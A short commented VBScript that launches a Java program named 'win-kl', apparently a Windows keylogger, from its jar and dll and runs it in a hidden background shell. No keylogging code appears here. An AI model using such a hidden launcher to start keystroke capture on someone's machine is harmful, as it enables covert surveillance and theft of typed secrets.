' This script is one example of how to run win-kl.
' If this script is in the same directory as the jar and dll artifacts,
' you'll probably only have to change the first and/or second variables.

' javaPath is the path to java.exe, it will probably be different on every
' system.
Dim javaPath
javaPath = """c:\Program Files (x86)\Java\jdk1.7.0_45\jre\bin\java.exe"""

' arguments hold the arguments to be passed to the main class. They are
' technically not necessary.
Dim arguments
arguments = ""

' classpath holds the location of the jar artifact.
Dim classpath
classpath = " -cp win-kl-java-0.1-jar-with-dependencies.jar "

' libraryPath holds the location of the directory containing the dll artifact.
Dim libraryPath
libraryPath = "-Djava.library.path=. "

' className is the name of the main class.
Dim className
className = "com.wassilak.win_kl.Win_KL "

' command pastes all of the above into one big command to run.
Dim command
command = javaPath & classpath & libraryPath & className & arguments

' WshShell is basically used to create a virtual/hidden shell and
' run the command...so the below runs the command in the background.
Set WshShell = WScript.CreateObject("WScript.Shell")
Return = WshShell.Run(command, 0, true)
